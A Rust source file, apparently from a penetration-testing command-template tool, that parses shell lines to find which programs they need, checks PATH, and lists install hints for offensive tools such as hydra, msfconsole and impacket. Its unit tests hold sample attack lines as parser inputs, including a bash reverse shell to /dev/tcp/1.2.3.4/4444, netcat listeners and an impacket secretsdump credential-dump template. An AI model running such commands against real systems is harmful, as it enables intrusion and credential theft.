//! Missing-tool detection: which programs a command line needs, whether they
//! are on PATH, and a short install hint for common pentest tools.

use crate::model::Command;
use std::collections::HashSet;
use std::path::{Path, PathBuf};

/// Shell builtins / keywords that never need a binary.
const BUILTINS: &[&str] = &[
    "echo", "printf", "cd", "export", "fg", "bg", "jobs", "read", "set", "unset", "source", ".",
    "eval", "exit", "true", "false", "test", "[", "[[", "alias", "type", "kill", "wait", "trap",
    "ulimit", "umask", "shift", "return", "local", "declare", "pushd", "popd", "hash", "history",
    ":", "break", "continue", "readonly", "let",
];

/// Words that just precede the real command (skipped).
const KEYWORDS_SKIP: &[&str] = &["do", "then", "else", "elif", "!", "{", "if", "while", "until", "time"];
/// Words that start a construct whose first word isn't a program.
const KEYWORDS_STOP: &[&str] = &["for", "case", "select", "function", "done", "fi", "esac", "}", "in"];

/// Run another command; not itself worth checking (always present).
const TRANSPARENT: &[&str] = &["sudo", "doas", "env", "nohup", "exec", "command", "nice", "stdbuf", "timeout", "xargs"];
/// Wrappers that are tools of their own: need both them and what they run.
const TOOL_WRAPPERS: &[&str] = &["rlwrap", "proxychains", "proxychains4"];
const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash"];

/// Programs a command needs: the explicit `requires`, else the first program
/// of every pipeline / `;` / `&&` segment of each step. Target-side commands
/// run on the victim, so they need nothing here.
pub fn required(cmd: &Command) -> Vec<String> {
    if cmd.is_target() {
        return Vec::new();
    }
    let home = dirs::home_dir();
    if !cmd.requires.is_empty() {
        let mut out = Vec::new();
        for r in &cmd.requires {
            let r = expand(r.trim(), home.as_deref());
            if !r.is_empty() && !out.contains(&r) {
                out.push(r);
            }
        }
        return out;
    }
    let mut out: Vec<String> = Vec::new();
    for step in cmd.run_steps() {
        for b in binaries(&step) {
            if !out.contains(&b) {
                out.push(b);
            }
        }
    }
    out
}

/// The programs a shell line runs, in order, de-duplicated. Skips builtins,
/// `VAR=val` prefixes, `sudo`/`env`-style wrappers and redirections, looks
/// inside `sh -c '…'`, expands `$HOME`/`~`, and leaves out anything it
/// can't know statically (`$VAR`, `$(…)`, placeholders, relative paths).
pub fn binaries(line: &str) -> Vec<String> {
    let home = dirs::home_dir();
    let mut out = Vec::new();
    collect(line, home.as_deref(), &mut out, 0);
    out
}

fn collect(line: &str, home: Option<&Path>, out: &mut Vec<String>, depth: usize) {
    if depth > 4 {
        return;
    }
    for seg in segments(line) {
        let words = words(&seg);
        for b in programs(&words, home, depth) {
            if !out.contains(&b) {
                out.push(b);
            }
        }
    }
}

/// Split a command line at `|`, `;`, `&`, `&&`, `||`, newlines and
/// parentheses outside quotes and `$(…)` / backticks. `>&` / `&>` stay.
fn segments(line: &str) -> Vec<String> {
    let chars: Vec<char> = line.chars().collect();
    let mut out = Vec::new();
    let mut cur = String::new();
    let (mut single, mut double, mut tick) = (false, false, false);
    let mut depth = 0usize; // $( … ) nesting
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if single {
            single = c != '\'';
            cur.push(c);
            i += 1;
            continue;
        }
        if c == '\\' {
            cur.push(c);
            if let Some(n) = chars.get(i + 1) {
                cur.push(*n);
            }
            i += 2;
            continue;
        }
        match c {
            '\'' if !double => single = true,
            '"' => double = !double,
            '`' => tick = !tick,
            '$' if chars.get(i + 1) == Some(&'(') => {
                depth += 1;
                cur.push_str("$(");
                i += 2;
                continue;
            }
            ')' if depth > 0 => {
                depth -= 1;
                cur.push(c);
                i += 1;
                continue;
            }
            _ => {}
        }
        let plain = !double && !tick && depth == 0;
        let prev = if i > 0 { chars[i - 1] } else { ' ' };
        let next = chars.get(i + 1).copied().unwrap_or(' ');
        let sep = plain
            && match c {
                '|' | ';' | '\n' | '(' | ')' => true,
                '&' => prev != '>' && next != '>',
                _ => false,
            };
        if sep {
            if !cur.trim().is_empty() {
                out.push(std::mem::take(&mut cur));
            }
            cur.clear();
        } else {
            cur.push(c);
        }
        i += 1;
    }
    if !cur.trim().is_empty() {
        out.push(cur);
    }
    out
}

/// A word with its quotes removed.
#[derive(Debug, Clone)]
struct Word {
    text: String,
}

fn words(seg: &str) -> Vec<Word> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut started = false;
    let (mut single, mut double) = (false, false);
    let mut it = seg.chars().peekable();
    while let Some(c) = it.next() {
        if single {
            if c == '\'' {
                single = false;
            } else {
                cur.push(c);
            }
            continue;
        }
        match c {
            '\'' if !double => {
                single = true;
                started = true;
            }
            '"' => {
                double = !double;
                started = true;
            }
            '\\' => {
                if let Some(n) = it.next() {
                    cur.push(n);
                }
                started = true;
            }
            c if c.is_whitespace() && !double => {
                if started {
                    out.push(Word { text: std::mem::take(&mut cur) });
                }
                started = false;
            }
            c => {
                cur.push(c);
                started = true;
            }
        }
    }
    if started {
        out.push(Word { text: cur });
    }
    out
}

fn is_assignment(w: &str) -> bool {
    match w.split_once('=') {
        Some((name, _)) => {
            let mut ch = name.chars();
            matches!(ch.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
                && ch.all(|c| c.is_ascii_alphanumeric() || c == '_')
        }
        None => false,
    }
}

fn is_placeholder(w: &str) -> bool {
    w.len() > 2
        && w.starts_with('<')
        && w.ends_with('>')
        && w[1..w.len() - 1].chars().all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
}

/// A redirection word (`2>/dev/null`, `>out`, `<in`). `bare` = the target
/// is the next word (`>` / `2>` alone).
fn redirection(w: &str) -> Option<bool> {
    if is_placeholder(w) {
        return None;
    }
    let rest = w.trim_start_matches(|c: char| c.is_ascii_digit() || c == '&');
    if rest.starts_with('>') || rest.starts_with('<') {
        let op_end = rest.trim_start_matches(['>', '<', '&', '|']);
        Some(op_end.is_empty())
    } else {
        None
    }
}

/// `$HOME/…`, `${HOME}/…`, `~/…` → absolute.
fn expand(w: &str, home: Option<&Path>) -> String {
    let Some(h) = home else { return w.to_string() };
    for p in ["$HOME/", "${HOME}/", "~/"] {
        if let Some(rest) = w.strip_prefix(p) {
            return h.join(rest).display().to_string();
        }
    }
    w.to_string()
}

/// The program(s) one simple command runs.
fn programs(words: &[Word], home: Option<&Path>, depth: usize) -> Vec<String> {
    let mut i = 0;
    while i < words.len() {
        let w = &words[i];
        let t = w.text.as_str();
        if let Some(bare) = redirection(t) {
            i += if bare { 2 } else { 1 };
            continue;
        }
        if is_assignment(t) {
            i += 1;
            continue;
        }
        if KEYWORDS_SKIP.contains(&t) {
            i += 1;
            continue;
        }
        if KEYWORDS_STOP.contains(&t) || BUILTINS.contains(&t) || t.is_empty() {
            return Vec::new();
        }
        if TRANSPARENT.contains(&t) {
            i = skip_wrapper_args(t, words, i + 1);
            continue;
        }
        let expanded = expand(t, home);
        let unknown = is_placeholder(t)
            || expanded.contains('$')
            || expanded.contains('`')
            || expanded.contains('<')
            || (expanded.contains('/') && !expanded.starts_with('/'));
        if unknown {
            return Vec::new();
        }
        let base = expanded.rsplit('/').next().unwrap_or(&expanded).to_string();
        if SHELLS.contains(&base.as_str()) {
            // sh -c 'script': what the script runs
            if let Some(pos) = words[i + 1..].iter().position(|w| w.text == "-c") {
                if let Some(script) = words.get(i + 1 + pos + 1) {
                    let mut inner = Vec::new();
                    collect(&script.text, home, &mut inner, depth + 1);
                    return inner;
                }
            }
            return Vec::new(); // a shell is always there
        }
        if TOOL_WRAPPERS.contains(&base.as_str()) {
            let mut v = vec![expanded];
            let mut j = i + 1;
            while j < words.len() && words[j].text.starts_with('-') {
                j += 1;
            }
            for p in programs(&words[j..], home, depth) {
                if !v.contains(&p) {
                    v.push(p);
                }
            }
            return v;
        }
        return vec![expanded];
    }
    Vec::new()
}

/// Index of the wrapped command after `sudo -u x`, `env A=b`, `timeout 5`, …
fn skip_wrapper_args(wrapper: &str, words: &[Word], mut i: usize) -> usize {
    let takes_arg: &[&str] = match wrapper {
        "sudo" | "doas" => &["-u", "-g", "-C", "-h", "-p", "-U", "-r", "-t"],
        "nice" => &["-n"],
        "timeout" => &["-s", "-k", "--signal", "--kill-after"],
        _ => &[],
    };
    while let Some(w) = words.get(i) {
        let t = w.text.as_str();
        if t == "--" {
            return i + 1;
        }
        if t.starts_with('-') && t.len() > 1 {
            i += if takes_arg.contains(&t) { 2 } else { 1 };
            continue;
        }
        if wrapper == "env" && is_assignment(t) {
            i += 1;
            continue;
        }
        break;
    }
    if wrapper == "timeout" && words.get(i).is_some_and(|w| w.text.chars().next().is_some_and(|c| c.is_ascii_digit())) {
        i += 1; // the duration
    }
    i
}

/// Executables found on PATH (plus `~/.local/bin`, where distrobox exports
/// its wrappers), scanned once and cached.
#[derive(Debug, Clone, Default)]
pub struct ToolIndex {
    names: HashSet<String>,
    /// Treat everything as installed (unit tests).
    all: bool,
}

impl ToolIndex {
    pub fn scan() -> Self {
        let mut dirs: Vec<PathBuf> = std::env::var_os("PATH")
            .map(|p| std::env::split_paths(&p).collect())
            .unwrap_or_default();
        if let Some(h) = dirs::home_dir() {
            let local = h.join(".local/bin");
            if !dirs.contains(&local) {
                dirs.push(local);
            }
        }
        let mut names = HashSet::new();
        for d in dirs {
            let Ok(rd) = std::fs::read_dir(&d) else { continue };
            for e in rd.flatten() {
                if is_exec(&e.path()) {
                    if let Some(n) = e.file_name().to_str() {
                        names.insert(n.to_string());
                    }
                }
            }
        }
        ToolIndex { names, all: false }
    }

    /// Everything counts as installed.
    #[cfg(test)]
    pub fn everything() -> Self {
        ToolIndex { names: HashSet::new(), all: true }
    }

    /// Only these names are installed.
    #[cfg(test)]
    pub fn from_names(names: &[&str]) -> Self {
        ToolIndex { names: names.iter().map(|s| s.to_string()).collect(), all: false }
    }

    pub fn count(&self) -> usize {
        self.names.len()
    }

    pub fn has(&self, bin: &str) -> bool {
        if self.all {
            return true;
        }
        if bin.starts_with('/') {
            return is_exec(Path::new(bin));
        }
        self.names.contains(bin)
    }

    /// Of `bins`, the ones that aren't installed.
    pub fn missing(&self, bins: &[String]) -> Vec<String> {
        bins.iter().filter(|b| !self.has(b)).cloned().collect()
    }
}

fn is_exec(p: &Path) -> bool {
    match std::fs::metadata(p) {
        Ok(m) if m.is_file() => {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                m.permissions().mode() & 0o111 != 0
            }
            #[cfg(not(unix))]
            true
        }
        _ => false,
    }
}

/// A short way to install `bin`: the Fedora `dnf` package, the Kali
/// (distrobox) `apt` name, or a pipx / cargo / gem / go install.
pub fn install_hint(bin: &str) -> Option<&'static str> {
    let base = bin.rsplit('/').next().unwrap_or(bin);
    if base.starts_with("impacket-") {
        return Some("pipx install impacket · kali: apt install python3-impacket");
    }
    Some(match base {
        "nmap" => "dnf install nmap",
        "nc" | "ncat" => "dnf install nmap-ncat",
        "masscan" => "dnf install masscan",
        "rustscan" => "cargo install rustscan",
        "ffuf" => "kali: apt install ffuf · go install github.com/ffuf/ffuf/v2@latest",
        "gobuster" => "kali: apt install gobuster",
        "feroxbuster" => "cargo install feroxbuster · kali: apt install feroxbuster",
        "nikto" => "dnf install nikto",
        "whatweb" => "kali: apt install whatweb",
        "wpscan" => "gem install wpscan · kali: apt install wpscan",
        "nuclei" => "kali: apt install nuclei",
        "sqlmap" => "dnf install sqlmap · pipx install sqlmap",
        "cewl" => "kali: apt install cewl",
        "hydra" => "dnf install hydra",
        "john" => "kali: apt install john (jumbo) · dnf install john",
        "zip2john" | "ssh2john" | "rar2john" | "keepass2john" => "kali: apt install john (jumbo)",
        "hashcat" => "dnf install hashcat",
        "hashid" => "pipx install hashid",
        "smbclient" | "rpcclient" => "dnf install samba-client",
        "smbmap" => "pipx install smbmap",
        "nxc" | "netexec" => "pipx install git+https://github.com/Pennyw0rth/NetExec",
        "enum4linux-ng" => "kali: apt install enum4linux-ng",
        "evil-winrm" => "gem install evil-winrm · kali: apt install evil-winrm",
        "kerbrute" => "kali: apt install kerbrute",
        "bloodhound-python" => "pipx install bloodhound",
        "ldapsearch" => "dnf install openldap-clients",
        "dig" => "dnf install bind-utils",
        "dnsrecon" => "kali: apt install dnsrecon",
        "dnsenum" => "kali: apt install dnsenum",
        "snmpwalk" => "dnf install net-snmp-utils",
        "onesixtyone" => "kali: apt install onesixtyone",
        "snmp-check" => "kali: apt install snmpcheck",
        "redis-cli" => "dnf install valkey · kali: apt install redis-tools",
        "mysql" => "dnf install mariadb",
        "psql" => "dnf install postgresql",
        "msfconsole" | "msfvenom" => "kali: apt install metasploit-framework",
        "chisel" => "kali: apt install chisel",
        "ligolo-proxy" => "kali: apt install ligolo-ng",
        "sshuttle" => "dnf install sshuttle",
        "socat" => "dnf install socat",
        "rlwrap" => "dnf install rlwrap",
        "pwncat-cs" => "pipx install pwncat-cs",
        "penelope" => "kali: apt install penelope",
        "steghide" => "dnf install steghide",
        "binwalk" => "dnf install binwalk",
        "foremost" => "dnf install foremost",
        "exiftool" => "dnf install perl-Image-ExifTool",
        "strings" => "dnf install binutils",
        "ltrace" => "dnf install ltrace",
        "checksec" => "dnf install checksec",
        "ropper" => "pipx install ropper",
        "pwn" => "pipx install pwntools",
        "gdb" => "dnf install gdb",
        "curl" => "dnf install curl",
        "wget" => "dnf install wget2-wget",
        "ssh" | "scp" => "dnf install openssh-clients",
        "python3" => "dnf install python3",
        "php" => "dnf install php-cli",
        "wl-copy" => "dnf install wl-clipboard",
        "xfreerdp" => "dnf install freerdp",
        "searchsploit" => "kali: apt install exploitdb",
        "responder" => "kali: apt install responder",
        "certipy" | "certipy-ad" => "pipx install certipy-ad",
        "gpp-decrypt" => "kali: apt install gpp-decrypt",
        "wfuzz" => "pipx install wfuzz",
        "arjun" => "pipx install arjun",
        _ => return None,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn b(s: &str) -> Vec<String> {
        binaries(s)
    }

    #[test]
    fn prefixes_and_wrappers_are_skipped() {
        assert_eq!(b("sudo nmap -sU <RHOST> -oN nmap/udp.txt"), ["nmap"]);
        assert_eq!(b("sudo -u root -E masscan -p1-65535 <RHOST>"), ["masscan"]);
        assert_eq!(b("PGPASSWORD=<PASS> psql -h <RHOST> -U <USER>"), ["psql"]);
        assert_eq!(b("A=1 B='x y' env C=2 hydra -l u"), ["hydra"]);
        assert_eq!(b("stty raw -echo icrnl 2>/dev/null; nc -lvnp 4444"), ["stty", "nc"]);
        assert_eq!(b("rlwrap nc -lvnp <LPORT>"), ["rlwrap", "nc"]);
        assert_eq!(b("timeout 5 nmap x"), ["nmap"]);
        assert_eq!(b("2>/dev/null nmap x"), ["nmap"]);
    }

    #[test]
    fn home_paths_expand() {
        let home = dirs::home_dir().unwrap();
        let want = home.join(".cargo/bin/rustscan").display().to_string();
        assert_eq!(b("$HOME/.cargo/bin/rustscan -a <RHOST>"), std::slice::from_ref(&want));
        assert_eq!(b("~/.cargo/bin/rustscan -a x"), [want]);
        assert_eq!(b("/opt/metasploit-framework/bin/msfconsole -q"), ["/opt/metasploit-framework/bin/msfconsole"]);
    }

    #[test]
    fn pipelines_chains_and_sh_c() {
        assert_eq!(b("printf %s <DATA> | base64 -w0; echo"), ["base64"]);
        assert_eq!(b("echo '<RHOST> <DOMAIN>' | sudo tee -a /etc/hosts"), ["tee"]);
        assert_eq!(b("whatweb <URL> && ffuf -u <URL>/FUZZ || true"), ["whatweb", "ffuf"]);
        assert_eq!(b("sh -c 'cewl <URL> -w words.txt'"), ["cewl"]);
        assert_eq!(b("bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'"), Vec::<String>::new());
        assert_eq!(b("nmap x 2>&1 | tee out"), ["nmap", "tee"]);
        // command substitution / variables aren't guessed
        assert_eq!(b("$(which nmap) -sV x"), Vec::<String>::new());
        assert_eq!(b("socat file:`tty`,raw,echo=0 tcp-listen:4444"), ["socat"]);
        assert_eq!(b("for p in 1 2; do nc -zv x $p; done"), ["nc"]);
        assert_eq!(b("./linpeas.sh"), Vec::<String>::new());
        assert_eq!(b("<FILE> --help"), Vec::<String>::new());
    }

    #[test]
    fn every_bundled_template_parses_and_known_ones_match() {
        let cmds = crate::model::load_bundled_for_tests();
        assert!(!cmds.is_empty());
        for c in &cmds {
            for step in c.run_steps() {
                let _ = binaries(&step); // must not panic
            }
            let req = required(c);
            if c.is_target() {
                assert!(req.is_empty(), "{} is target-side but needs {req:?}", c.name);
            }
            for r in &req {
                assert!(!r.is_empty() && !r.contains(' '), "{}: odd binary {r:?}", c.name);
            }
        }
        let by_first = |bin: &str| cmds.iter().any(|c| !c.is_target() && required(c).first().map(String::as_str) == Some(bin));
        for bin in ["nmap", "ffuf", "hydra", "wpscan", "cewl", "smbclient", "nxc", "psql", "rlwrap", "msfconsole"] {
            assert!(by_first(bin), "no bundled local command starts with {bin}");
        }
    }

    #[test]
    fn requires_overrides_the_guess_and_target_side_needs_nothing() {
        let mut c: Command = toml::from_str(
            "category='x'\nname='y'\ntemplate='python3 /opt/impacket/secretsdump.py <USER>@<RHOST>'",
        )
        .unwrap();
        assert_eq!(required(&c), ["python3"]);
        c.requires = vec!["impacket-secretsdump".into()];
        assert_eq!(required(&c), ["impacket-secretsdump"]);
        c.side = crate::model::Side::Target;
        assert!(required(&c).is_empty());
        let idx = ToolIndex::from_names(&[]);
        assert!(idx.missing(&required(&c)).is_empty());
    }

    #[test]
    fn index_lookup() {
        let idx = ToolIndex::from_names(&["nmap"]);
        assert!(idx.has("nmap"));
        assert!(!idx.has("cewl"));
        assert!(!idx.has("/nonexistent/pivt-test-bin"));
        assert!(idx.has("/bin/sh") || !Path::new("/bin/sh").exists());
        assert_eq!(idx.missing(&["nmap".into(), "cewl".into()]), ["cewl"]);
        assert!(ToolIndex::everything().has("anything"));
    }

    #[test]
    fn hints_cover_common_tools() {
        for t in ["nmap", "wpscan", "cewl", "impacket-secretsdump", "nxc", "feroxbuster", "rustscan"] {
            assert!(install_hint(t).is_some(), "{t}");
        }
        assert!(install_hint("definitely-not-a-tool").is_none());
    }
}
